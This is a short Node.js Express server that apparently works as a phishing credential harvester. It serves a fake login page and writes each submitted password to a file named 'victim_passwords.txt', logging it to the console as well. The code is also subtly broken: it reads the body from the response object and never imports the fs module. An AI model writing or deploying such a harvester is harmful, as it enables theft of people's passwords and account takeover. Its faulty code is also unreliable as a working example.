const express = require('express');
const path = require('path');

const app = express();

app.use(express.urlencoded({ extended: true }));

// http://localhost:80/
app.get('/', function(req, res) {
	console.log('The client tried to enter a website.');
	// Render login template
	res.sendFile(path.join(__dirname + '/index2.html'));
});

// http://localhost:80/password
app.post('/password', function(req, res) {
	// Capture the input fields
	let password = res.body.password;
	fs.appendFileSync('victim_passwords.txt', `password : ${password} \n`);
    console.log(`The client enter another password : ${password} \nYou may also see this password in - passwords.txt`);
});

app.listen(80);